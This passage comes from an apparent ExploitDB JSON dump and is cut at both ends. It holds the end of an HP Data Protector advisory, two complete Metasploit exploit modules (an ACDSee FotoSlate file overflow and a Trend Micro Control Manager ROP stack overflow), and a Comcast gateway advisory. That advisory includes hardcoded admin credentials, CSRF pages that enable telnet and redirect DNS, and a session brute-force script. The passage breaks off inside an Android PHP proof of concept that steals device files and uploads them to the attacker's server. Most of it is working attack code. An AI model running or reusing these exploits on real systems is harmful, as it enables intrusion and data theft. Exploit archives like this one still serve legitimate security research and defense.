http://hp.com/go/dataprotector\r\n[2] HPSBMU02686 SSRT100541 rev.2 - HP OpenView Storage Data Protector,\r\nRemote Execution of Arbitrary Code\r\nhttp://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182\r\n\r\n\r\n11. *About CoreLabs*\r\n\r\nCoreLabs, the research center of Core Security Technologies, is charged\r\nwith anticipating the future needs and requirements for information\r\nsecurity technologies. We conduct our research in several important\r\nareas of computer security including system vulnerabilities, cyber\r\nattack planning and simulation, source code auditing, and cryptography.\r\nOur results include problem formalization, identification of\r\nvulnerabilities, novel solutions and prototypes for new technologies.\r\nCoreLabs regularly publishes security advisories, technical papers,\r\nproject information and shared software tools for public use at:\r\nhttp://corelabs.coresecurity.com.\r\n\r\n\r\n12. *About Core Security Technologies*\r\n\r\nCore Security Technologies enables organizations to get ahead of threats\r\nwith security test and measurement solutions that continuously identify\r\nand demonstrate real-world exposures to their most critical assets. Our\r\ncustomers can gain real visibility into their security standing, real\r\nvalidation of their security controls, and real metrics to more\r\neffectively secure their organizations.\r\n\r\nCore Security's software solutions build on over a decade of trusted\r\nresearch and leading-edge threat expertise from the company's Security\r\nConsulting Services, CoreLabs and Engineering groups. Core Security\r\nTechnologies can be reached at +1 (617) 399-6980 or on the Web at:\r\nhttp://www.coresecurity.com.\r\n\r\n\r\n13. *Disclaimer*\r\n\r\nThe contents of this advisory are copyright (c) 2011 Core Security\r\nTechnologies and (c) 2011 CoreLabs, and are licensed under a Creative\r\nCommons Attribution Non-Commercial Share-Alike 3.0 (United States)\r\nLicense: http://creativecommons.org/licenses/by-nc-sa/3.0/us/\r\n\r\n\r\n14. *PGP/GPG Keys*\r\n\r\nThis advisory has been signed with the GPG key of Core Security\r\nTechnologies advisories team, which is available for download at\r\nhttp://www.coresecurity.com/files/attachments/core_security_advisories.asc.\r\n-----BEGIN PGP SIGNATURE-----\r\nVersion: GnuPG v1.4.9 (MingW32)\r\n\r\niEYEARECAAYFAk4LnZsACgkQyNibggitWa07/ACfSlzkBvbowAskeP/K4FqtxCay\r\nEAkAnRCPKdc35t5Cb0ZJbGy4me4JRALo\r\n=zHon\r\n-----END PGP SIGNATURE-----",
                "description": "HP Data Protector 6.20 - EXEC_CMD Buffer Overflow",
                "author": "Core Security",
                "_id": 17461,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-06-30T00:00:00+00:00",
                "cve": [
                    "CVE-2011-1866"
                ],
                "type": "dos",
                "port": 0
            },
            {
                "code": "##\r\n# $Id: acdsee_fotoslate_string.rb 13853 2011-10-10 16:47:33Z sinn3r $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::FILEFORMAT\r\n\tinclude Msf::Exploit::Remote::Seh\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'ACDSee FotoSlate PLP File id Parameter Overflow',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a buffer overflow in ACDSee FotoSlate 4.0 Build 146 via\r\n\t\t\t\ta specially crafted id parameter in a String element.  When viewing a malicious\r\n\t\t\t\tPLP file with the ACDSee FotoSlate product, a remote attacker could overflow a\r\n\t\t\t\tbuffer and execute arbitrary code. This exploit has been tested on systems such as\r\n\t\t\t\tWindows XP SP3, Windows Vista, and Windows 7.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Parvez Anwar', # Vulnerability discovery\r\n\t\t\t\t\t'juan vazquez'  # Metasploit module\r\n\t\t\t\t],\r\n\t\t\t'Version'        => '$Revision: 13853 $',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2011-2595' ],\r\n\t\t\t\t\t[ 'OSVDB', '75425' ],\r\n\t\t\t\t\t[ 'BID', '49558' ],\r\n\t\t\t\t],\r\n\t\t\t'DefaultOptions' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'EXITFUNC' => 'process',\r\n\t\t\t\t\t'DisablePayloadHandler' => 'true'\r\n\t\t\t\t},\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t#'Space'    => 4000,\r\n\t\t\t\t\t'BadChars' => \"\\x00\\x22\"\r\n\t\t\t\t},\r\n\t\t\t'Platform' => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'ACDSee FotoSlate 4.0 Build 146',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'         => 0x263a5b57, # pop, pop, ret from ipwssl6.dll\r\n\t\t\t\t\t\t\t'Offset'      => 1812,\r\n\t\t\t\t\t\t\t'TotalLength' => 5000\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => 'Sep 12 2011',\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\tregister_options(\r\n\t\t\t[\r\n\t\t\t\tOptString.new('FILENAME', [ true, 'The file name.',  'msf.plp']),\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\toverflow = rand_text(target[\"Offset\"])\r\n\t\toverflow << generate_seh_record(target.ret)\r\n\t\toverflow << payload.encoded\r\n\t\toverflow << rand_text_alpha(target[\"TotalLength\"] - overflow.length)\r\n\r\n\t\tplp =<<TEMPLATE\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<ACDFotoSlateDocument15>\r\n<PageDefinition>\r\n<Template>\r\n<Version>3.0</Version>\r\n<Page>\r\n<Name>Letter</Name>\r\n<Properties>\r\n<String id=\"#{overflow}\"></String>\r\n<String id=\"Width\">8.500000IN</String>\r\n<String id=\"Height\">11.000000IN</String>\r\n<String id=\"Orientation\">Portrait</String>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Bool id=\"AutoFill\">FALSE</Bool>\r\n</Properties>\r\n<Content>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGImageType\">0</Int>\r\n<String id=\"BGImageFile\"></String>\r\n<Int id=\"BGColor\">16777215</Int>\r\n</Content>\r\n</Page>\r\n<ToolList>\r\n<Group>\r\n<Tool>\r\n<Name>Image</Name>\r\n<Properties>\r\n<String id=\"XPos\">0.500000IN</String>\r\n<String id=\"YPos\">0.500000IN</String>\r\n<String id=\"Width\">7.500000IN</String>\r\n<String id=\"Height\">10.000000IN</String>\r\n<Float id=\"Tilt\">0.000000</Float>\r\n</Properties>\r\n<Content>\r\n<Int id=\"ShapeType\">0</Int>\r\n<Float id=\"RoundRectX\">0.000000</Float>\r\n<Float id=\"RoundRectY\">0.000000</Float>\r\n<Bool id=\"ShrinkToFit\">FALSE</Bool>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Float id=\"BorderWidth\">0.000000</Float>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGColor\">8454143</Int>\r\n<Bool id=\"DropShadow\">FALSE</Bool>\r\n<Int id=\"DSColor\">0</Int>\r\n<Bool id=\"BevelEdge\">FALSE</Bool>\r\n<Bool id=\"Border\">FALSE</Bool>\r\n<Int id=\"BorderColor\">16711680</Int>\r\n<Bool id=\"IsLocked\">FALSE</Bool>\r\n</Content>\r\n</Tool>\r\n</Group>\r\n</ToolList>\r\n</Template>\r\n<PageContent>\r\n<Version>3.0</Version>\r\n<Page>\r\n<Name>Letter</Name>\r\n<Content>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGImageType\">0</Int>\r\n<String id=\"BGImageFile\"></String>\r\n<Int id=\"BGColor\">16777215</Int>\r\n</Content>\r\n</Page>\r\n<ToolList>\r\n<Group>\r\n<Tool>\r\n<Name>Image</Name>\r\n<Content>\r\n<Int id=\"ShapeType\">0</Int>\r\n<Float id=\"RoundRectX\">0.000000</Float>\r\n<Float id=\"RoundRectY\">0.000000</Float>\r\n<Bool id=\"ShrinkToFit\">FALSE</Bool>\r\n<Bool id=\"AutoRotate\">FALSE</Bool>\r\n<Float id=\"BorderWidth\">0.000000</Float>\r\n<Bool id=\"UseBGColor\">FALSE</Bool>\r\n<Int id=\"BGColor\">8454143</Int>\r\n<Bool id=\"DropShadow\">FALSE</Bool>\r\n<Int id=\"DSColor\">0</Int>\r\n<Bool id=\"BevelEdge\">FALSE</Bool>\r\n<Bool id=\"Border\">FALSE</Bool>\r\n<Int id=\"BorderColor\">16711680</Int>\r\n<Bool id=\"IsLocked\">FALSE</Bool>\r\n</Content>\r\n</Tool>\r\n</Group>\r\n</ToolList>\r\n</PageContent>\r\n</PageDefinition>\r\n</ACDFotoSlateDocument15>\r\nTEMPLATE\r\n\r\n\t\tprint_status(\"Creating '#{datastore['FILENAME']}' file ...\")\r\n\t\tfile_create(plp)\r\n\tend\r\n\r\nend\r\n\r\n\r\n=begin\r\nAfter SEH, we have ~0x23C3 bytes (9155 in decimal) of space for payload. But we need to avoid\r\nusing a long buffer in order to avoid the meterpreter possibly being broken.\r\n=end",
                "description": "ACDSee FotoSlate - '.PLP' File 'id' Local Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 17966,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-10-10T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n#   http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info={})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => \"TrendMicro Control Manger <= v5.5 CmdProcessor.exe Stack Buffer Overflow\",\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a vulnerability in the CmdProcessor.exe component of Trend\r\n\t\t\t\tMicro Control Manger up to version 5.5.\r\n\r\n\t\t\t\t\tThe specific flaw exists within CmdProcessor.exe service running on TCP port\r\n\t\t\t\t20101. The vulnerable function is the CGenericScheduler::AddTask function of\r\n\t\t\t\tcmdHandlerRedAlertController.dll. When processing a specially crafted IPC packet,\r\n\t\t\t\tcontrolled data is copied into a 256-byte stack buffer. This can be exploited\r\n\t\t\t\tto execute remote code under the context of the user.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Luigi Auriemma',  #Initial discovery\r\n\t\t\t\t\t'Blue',            #Metasploit\r\n\t\t\t\t],\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t['CVE', '2011-5001'],\r\n\t\t\t\t\t['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-345/']\r\n\t\t\t\t],\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars' => \"\\x00\",\r\n\t\t\t\t},\r\n\t\t\t'DefaultOptions'  =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'ExitFunction' => 'process',\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t# TCM 5.5 cannot be installed in Win2k3 SP0-SP1, Win2k8, or XP\r\n\t\t\t\t\t\t'Windows 2003 Server SP2 (DEP Bypass)',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'    => 0x666b34c8, # TMNotify.dll stack pivot\r\n\t\t\t\t\t\t\t'Offset' => 5000\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => \"Dec 07 2011\",\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\t\tregister_options(\r\n\t\t\t[\r\n\t\t\t\tOpt::RPORT(20101)\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\tdef junk\r\n\t\treturn rand_text(4).unpack(\"L\")[0].to_i\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\t#TmUpdate.dll\r\n\t\trop_chain = [\r\n\t\t\t0x668074d4,\t# POP EDX # OR AL,0F6 # RETN\r\n\t\t\t0x3FCD0FFC,\t# Put 00001000 into edx\r\n\t\t\t0x667611b2,\t# ADD EDX,C0330004 # RETN 04\r\n\t\t\t0x667c99e7,\t# POP EBP # RETN [TmUpdate.dll]\r\n\t\t\tjunk,\r\n\t\t\t0x667c99e7,\t# skip 4 bytes [TmUpdate.dll]\r\n\t\t\t0x667e3250,\t# POP EBX # RETN [TmUpdate.dll]\r\n\t\t\t0xffffffff,\t# NEG EBX\r\n\t\t\t0x6683ab64,\t# INC EBX # XOR EAX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6683ab64,\t# INC EBX # XOR EAX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6680a1d3,\t# POP EAX # RETN [TmUpdate.dll]\r\n\t\t\t0xffffffc0,\t# Value to negate, will become 0x00000040\r\n\t\t\t0x66812b53,\t# NEG EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x667f030a,\t# MOV ECX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x667d4c7c,\t# POP EDI # RETN [TmUpdate.dll]\r\n\t\t\t0x667e8003,\t# RETN (ROP NOP) [TmUpdate.dll]\r\n\t\t\t0x667d54d0,\t# POP ESI # RETN [TmUpdate.dll]\r\n\t\t\t0x667baf06,\t# JMP [EAX] [TmUpdate.dll]\r\n\t\t\t0x66833376,\t# POP EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6686115c,\t# ptr to &VirtualAlloc() [IAT TmUpdate.dll]\r\n\t\t\t0x6681ceb3,\t# PUSHAD # RETN [TmUpdate.dll]\r\n\t\t\t0x668382c3,\t# ptr to 'call esp' [TmUpdate.dll]\r\n\t\t].pack('V*')\r\n\t\t#rop chain generated by mona.py\r\n\r\n\t\theader  = \"\\x00\\x00\"\r\n\t\theader << \"\\x13\\x88\"          #size of buffer\r\n\t\theader << rand_text_alpha(9)\r\n\t\theader << \"\\x15\\x09\\x13\"      #opcode\r\n\t\theader << \"\\x00\\x00\\x00\"\r\n\t\theader << rand_text_alpha(25)\r\n\t\theader << \"\\xFE\\xFF\\xFF\\xFF\"  #in instruction #MOV EDI,DWORD PTR DS:[EAX+ECX] #ECX is our buffer and needs to be readable dword\r\n\t\theader << \"\\xFF\\xFF\\xFF\\xFF\"  #after sum with EAX. Pointer from EAX increments by #LEA EAX,DWORD PTR DS:[EAX+EDI+4] and then is saved\r\n\t\theader << \"\\xFF\\xFF\\xF4\\xFF\"  #and used again. We can essentially walk the loop which increments EBX by 1 until we get to 14 which leads\r\n\t\theader << \"\\xFF\\xFF\"          #us to our vulnerable function\r\n\t\theader << rand_text_alpha(1)  #align stack again for rop\r\n\r\n\t\tpay = rop_chain\r\n\t\tpay << make_nops(374 - rop_chain.length)\r\n\t\tpay << \"\\xeb\\x04\"  #Short jmp 0x04\r\n\t\tpay << [target.ret].pack('V')\r\n\t\tpay << payload.encoded\r\n\r\n\t\tsploit = header\r\n\t\tsploit << pay\r\n\r\n\t\tfiller = rand_text_alpha(target['Offset'] - (sploit.length))\r\n\r\n\t\tconnect\r\n\t\tprint_status(\"Sending request...\")\r\n\t\tsock.put(sploit + filler)\r\n\t\thandler\r\n\t\tdisconnect\r\n\r\n\tend\r\n\r\nend",
                "description": "Trend Micro Control Manger 5.5 - 'CmdProcessor.exe' Remote Stack Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 18514,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2012-02-23T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "Trustwave's SpiderLabs Security Advisory TWSL2011-002:\r\nVulnerabilities in Comcast DOCSIS 3.0 Business Gateways\r\n(D3G-CCR)\r\n\r\nhttps://www.trustwave.com/spiderlabs/advisories/TWSL2011-002.txt\r\n\r\nPublished: 2011-02-04\r\nVersion: 1.0\r\n\r\nVendor: Comcast (http://comcast.com)\r\nProduct: Comcast DOCSIS 3.0 Business Gateway - D3G-CCR\r\nVersion affected:  Versions prior to 1.4.0.49.2\r\n\r\nProduct description:\r\nThe Comcast DOCSIS 3.0 Business Gateway provides end-user termination of\r\ncable internet services for Comcast Business Class customers with enhanced\r\nservices including Network Address Translation (NAT), firewalling, and\r\nVirtual Private Network (VPN) termination.\r\n\r\nCredit: Zack Fasel and Matthew Jakubowski of Trustwave's SpiderLabs\r\n\r\nFinding 1: Static Credentials\r\nCVE: CVE-2011-0885\r\n\r\nAll D3G-CCR gateways provided by Comcast have an administrative\r\nlogin of \"mso\" with the password of \"D0nt4g3tme\".  These passwords\r\nare not provided as a part of the installation of the device and are\r\nnot recommended to be changed, thus the majority of users are unaware\r\nof the default configuration.\r\n\r\nWith these default credentials, internal attackers can modify device\r\nconfigurations to leverage more significant attacks, including redirection\r\nof DNS requests, creation of a remote VPN termination point, and\r\nmodification of NAT entries.  These credentials provide access to the web\r\ninterface for management, as well as a telnet interface that provides shell\r\naccess to the device.  The mso login provides shell as UID 0 (root).\r\n\r\n\r\nFinding 2: Cross Site Request Forgery (CSRF)\r\nCVE: CVE-2011-0886\r\nD3G-CCR gateways provided by Comcast permit CSRF attacks against\r\nnumerous management pages allowing an attacker to embed in a webpage a\r\nmalicious request against the gateway's management interface.  Through\r\nthis, an attacker can modify device configuration and enable remote\r\nadministration via a telnet shell and http.\r\n\r\nThe following Proof of Concept (PoC) connects to the gateway, logs in,\r\nmodifies the remote administration to allow any user to connect externally,\r\nand modifies the DNS information.\r\n\r\n## d3g-csrf-poc.htm\r\n\r\n<html>\r\n<body>\r\n<iframe src=\"./d3g-csrf-poc-1.htm\" width=\"1\" height=\"1\">\r\n</iframe>\r\n<iframe src=\"./d3g-csrf-poc-2.htm\" width=\"1\" height=\"1\">\r\n</iframe>\r\n<iframe src=\"./d3g-csrf-poc-3.htm\" width=\"1\" height=\"1\">\r\n</iframe> </body> </html>\r\n\r\n## d3g-csrf-poc-1.htm\r\n\r\n<html>\r\n<body>\r\n<form action=\"http://10.1.10.1/goform/login\" method=\"post\"\r\n\tname=\"tF\">\r\n<input type=\"hidden\" name=\"user\" value=\"mso\" />\r\n<input type=\"hidden\" name=\"pws\" value=\"D0nt4g3tme\" />\r\n</form> <script> document.tF.submit(); </script> </body>\r\n</html>\r\n\r\n## d3g-csrf-poc-2.htm\r\n\r\n<html>\r\n<body>\r\n<form action=\"http://10.1.10.1/goform/RemoteRange\"\r\nname=\"RMangement\" method=\"post\"> <input type=\"hidden\"\r\nvalue=\"feat-admin-remote\" name=\"file\"> <input type=\"hidden\"\r\nvalue=\"admin/\" name=\"dir\"> <input type=\"hidden\"\r\nname=\"RemoteRange\" value=\"0\" /> <input type=\"hidden\"\r\nname=\"rm_access\" value=\"on\" /> <input type=\"hidden\"\r\nname=\"Remote0\" value=\"0.0.0.0,0.0.0.0,1\" /> <input\r\ntype=\"hidden\" name=\"http_port\" value=\"8080\" /> <input\r\ntype=\"hidden\" name=\"http_enable\" value=\"on\" /> <input\r\ntype=\"hidden\" name=\"http_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"msoremote_enableCheck\" value=\"on\" />\r\n<input type=\"hidden\" name=\"mso_remote_enable\" value=\"1\" />\r\n<input type=\"hidden\" name=\"remote_enable\" value=\"0\" />\r\n<input type=\"hidden\" name=\"https_enable\" value=\"on\" />\r\n<input type=\"hidden\" name=\"https_port\" value=\"8181\" />\r\n<input type=\"hidden\" name=\"https_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"telnet_enable\" value=\"on\" /> <input\r\ntype=\"hidden\" name=\"telnet_port\" value=\"2323\" /> <input\r\ntype=\"hidden\" name=\"telnet_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"Remote1=\" value=\"\" /> </form> </body>\r\n</html> <script>\r\nsetTimeout(\"document.RMangement.submit()\",4000);\r\n</script>\r\n</body>\r\n</html>\r\n\r\n## d3g-csrf-poc-3.htm\r\n\r\n<html>\r\n<body>\r\n<form name=\"WanIPform\"\r\naction=\"http://10.1.10.1/goform/Basic\" method=\"post\"> <input\r\ntype=\"hidden\" value=\"feat-wan-ip\" name=\"file\"> <input\r\ntype=\"hidden\" value=\"admin/\" name=\"dir\"> <input\r\ntype=\"hidden\" value=\"Fixed\" name=\"DNSAssign\"> <input\r\ntype=\"hidden\" value=\"0\" name=\"dhcpc_release\"> <input\r\ntype=\"hidden\" value=\"0\" name=\"dhcpc_renew\"> <input\r\ntype=\"hidden\" value=\"\" name=\"domain_name\"> <input\r\ntype=\"hidden\" value=\"\" name=\"WDn\"> <input type=\"hidden\"\r\nname=\"SysName\" value=\"\" /> <input type=\"hidden\"\r\nname=\"manual_dns_enable\" value=\"on\" /> <input type=\"hidden\"\r\nname=\"DAddr\" value=\"4.2.2.1\" /> <input type=\"hidden\"\r\nname=\"DAddr0\" value=\"4\" /> <input type=\"hidden\"\r\nname=\"DAddr1\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"DAddr2\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"DAddr3\" value=\"1\" /> <input type=\"hidden\"\r\nname=\"PDAddr\" value=\"4.2.2.2\" /> <input type=\"hidden\"\r\nname=\"PDAddr0\" value=\"4\" /> <input type=\"hidden\"\r\nname=\"PDAddr1\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"PDAddr2\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"PDAddr3\" value=\"2\" /> </form> <script>\r\nsetTimeout(\"document.WanIPform.submit()\",5000);\r\n</script>\r\n</body>\r\n</html>\r\n\r\nIf the PoC was embedded in any web page the targeted user visited while\r\nlogged into the device, the attacker would be provided remote\r\nadministration in to the gateway device include a telnet shell.  This would\r\nallow the attacker to redirect traffic to a malicious end-point.\r\n\r\n\r\nFinding 3: Weak Session Management \r\nCVE: CVE-2011-0887\r\nD3G-CCR gateways provided by Comcast utilize a predictable value to\r\nvalidate the active web management portal session.  The epoch time of\r\nbeginning of the session is stored as a cookie labeled \"userid\".  This\r\nprovides a predictable range of session IDs that can be brute-forced.\r\n\r\nThe following PoC attempts to brute force the session IDs by requesting the\r\nadmin page with an incrementing cookie and determining whether it wants to\r\nredirect to login.asp.\r\n\r\n## d3g-session-poc.sh\r\n\r\n#!/bin/bash\r\nstart=1267604160\r\nend=1267605960\r\nfor (( i=$start; i<=$end; i++)) do if [ `curl -sb userid=$i\r\nhttp://10.1.10.1/admin/index.asp | grep -c login.asp` -lt\r\n\"1\" ] then echo \"Session ID Found:  $i\"\r\nfi\r\nif [ $(($i % 100)) -eq \"0\" ]\r\nthen echo \"Currently at $i\"\r\nfi\r\ndone\r\n\r\nThrough this, an attacker can brute-force the possible valid session IDs.\r\nSessions do by default expire within 10 minutes, thus the attack window is\r\nlimited but can be leveraged with other attack methods.\r\n\r\n\r\nVendor Response:\r\nThese issues have been addressed as of version 1.4.0.49.2\r\n\r\nRemediation Steps:\r\nIn order to determine if the correct version is installed, users should\r\nview the \"About\" link in the management interface. Versions 1.4.0.49.2 and\r\nabove have been corrected.\r\n\r\nVendor Communication Timeline:\r\n08/30/10 - Vulnerability disclosed\r\n01/21/11 - Patch Released\r\n02/04/11 - Advisory Published\r\n\r\nRevision History:\r\n1.0 Initial publication\r\n\r\n\r\nAbout Trustwave:\r\nTrustwave is the leading provider of on-demand and subscription-based\r\ninformation security and payment card industry compliance management\r\nsolutions to businesses and government entities throughout the world. For\r\norganizations faced with today's challenging data security and compliance\r\nenvironment, Trustwave provides a unique approach with comprehensive\r\nsolutions that include its flagship TrustKeeper compliance management\r\nsoftware and other proprietary security solutions. Trustwave has helped\r\nthousands of organizations--ranging from Fortune 500 businesses and large\r\nfinancial institutions to small and medium-sized retailers--manage\r\ncompliance and secure their network infrastructure, data communications and\r\ncritical information assets. Trustwave is headquartered in Chicago with\r\noffices throughout North America, South America, Europe, Africa, China and\r\nAustralia. For more information, visit https://www.trustwave.com\r\n\r\nAbout Trustwave's SpiderLabs:\r\nSpiderLabs(R) is the advanced security team at Trustwave focused on\r\napplication security, incident response, penetration testing, physical\r\nsecurity and security research. The team has performed over a thousand\r\nincident investigations, thousands of penetration tests and hundreds of\r\napplication security tests globally. In addition, the SpiderLabs Research\r\nteam provides intelligence through bleeding-edge research and proof of\r\nconcept tool development to enhance Trustwave's products and services.\r\nhttps://www.trustwave.com/spiderlabs\r\n\r\nDisclaimer:\r\nThe information provided in this advisory is provided \"as is\" without\r\nwarranty of any kind. Trustwave disclaims all warranties, either express or\r\nimplied, including the warranties of merchantability and fitness for a\r\nparticular purpose. In no event shall Trustwave or its suppliers be liable\r\nfor any damages whatsoever including direct, indirect, incidental,\r\nconsequential, loss of business profits or special damages, even if\r\nTrustwave or its suppliers have been advised of the possibility of such\r\ndamages. Some states do not allow the exclusion or limitation of liability\r\nfor consequential or incidental damages so the foregoing limitation may not\r\napply.",
                "description": "Comcast DOCSIS 3.0 Business Gateways - Multiple Vulnerabilities",
                "author": "Trustwave's SpiderLabs",
                "_id": 16123,
                "source": "ExploitDB",
                "platform": "hardware",
                "date": "2011-02-06T00:00:00+00:00",
                "cve": [
                    "CVE-2011-0885",
                    "CVE-2011-0886",
                    "CVE-2011-0887"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "<?php \r\n/* \r\n* Description:  Android 'content://' URI Multiple Information Disclosure Vulnerabilities\r\n* Bugtraq ID:   48256\r\n* CVE:          CVE-2010-4804\r\n* Affected:     Android < 2.3.4\r\n* Author:       Thomas Cannon\r\n* Discovered:   18-Nov-2010\r\n* Advisory:     http://thomascannon.net/blog/2010/11/android-data-stealing-vulnerability/\r\n*\r\n* Filename:     poc.php\r\n* Instructions: Specify files you want to upload in filenames array. Host this php file\r\n*               on a server and visit it using the Android Browser. Some builds of Android\r\n*               may require adjustments to the script, for example when a German build was\r\n*               tested it downloaded the payload as .htm instead of .html, even though .html\r\n*               was specified. \r\n*\r\n* Tested on:    HTC Desire (UK Version) with Android 2.2\r\n*/\r\n\r\n//  List of the files on the device that we want to upload to our server\r\n$filenames = array(\"/proc/version\",\"/sdcard/img.jpg\");\r\n\r\n//  Determine the full URL of this script\r\n$protocol = $_SERVER[\"HTTPS\"] == \"on\" ? \"https\" : \"http\";\r\n$scripturl = $protocol.\"://\".$_SERVER[\"HTTP_HOST\"].$_SERVER[\"SCRIPT_NAME\"];\r\n\r\n//  Stage 0:  Display introduction text and a link to start the PoC.\r\nfunction stage0($scripturl) {\r\n  echo \"<b>Android < 2.3.4</b><br>Data Stealing Web Page<br><br>Click: <a href=\\\"$scripturl?stage=1\\\">Malicious Link</a>\";\r\n}\r\n\r\n//  Stage 1:  Redirect to Stage 2 which will force a download of the HTML/JS payload, then a few seconds later redirect \r\n//            to the payload. We load the payload using a Content Provider so that the JavaScript is executed in the\r\n//            context of the local device - this is the vulnerability.\r\nfunction stage1($scripturl) {\r\n  echo \"<body onload=\\\"setTimeout('window.location=\\'$scripturl?stage=2\\'',1000);setTimeout('window.location=\\'content://com.android.htmlfileprovider/sdcard/download/poc.html\\'',5000);\\\">\";\r\n}\r\n\r\n//  Stage 2:  Download of payload, the Android browser doesn't prompt for the download which is another vulnerability.\r\n//            The payload uses AJAX calls to read file contents and encodes as Base64, then uploads to server (Stage 3).\r\nfunction stage2($scripturl,$filenames) {\r\n  header(\"Cache-Control: public\");\r\n  header(\"Content-Description: File Transfer\");\r\n  header(\"Content-Disposition: attachment; filename=poc.html\");\r\n  header(\"Content-Type: text/html\");\r\n  header(\"Content-Transfer-Encoding: binary\");\r\n?>\r\n<html>\r\n  <body>\r\n    <script language='javascript'>\r\n      var filenames = Array('<?php echo implode(\"','\",$filenames); ?>');\r\n      var filecontents = new Array();\r\n      function processBinary(xmlhttp) {\r\n        data = xmlhttp.responseText;    r = '';   size = data.length;\r\n        for(var i = 0; i < size; i++)   r += String.fromCharCode(data.charCodeAt(i) & 0xff);\r\n        return r;\r\n      }\r\n      function getFiles(filenames) {\r\n        for (var filename in filenames) {\r\n          filename = filenames[filename];\r\n          xhr = new XMLHttpRequest();\r\n          xhr.open('GET', filename, false);\r\n          xhr.overrideMimeType('text/plain; charset=x-user-defined');\r\n          xhr.onreadystatechange = function() { if (xhr.readyState == 4) { filecontents[filename] = btoa(processBinary(xhr)); } }\r\n          xhr.send();\r\n        }\r\n      }\r\n      function addField(form, name, value) {\r\n        var fe = document.createElement('input');\r\n        fe.setAttribute('type', 'hidden');\r\n        fe.setAttribute('name', name);\r\n        fe.setAttribute('value', value);\r\n        form.appendChild(fe);\r\n      }\r\n      function uploadFiles(filecontents) {\r\n        var form = document.createElement('form');\r\n        form.setAttribute('method', 'POST');\r\n        form.setAttribute('enctype', 'multipart/form-data');\r\n        form.setAttribute('action', '<?=$scripturl?>?stage=3');\r\n        var i = 0;\r\n        for (var filename in filecontents) {\r\n          addField(form, 'filename'+i, btoa(filename));\r\n          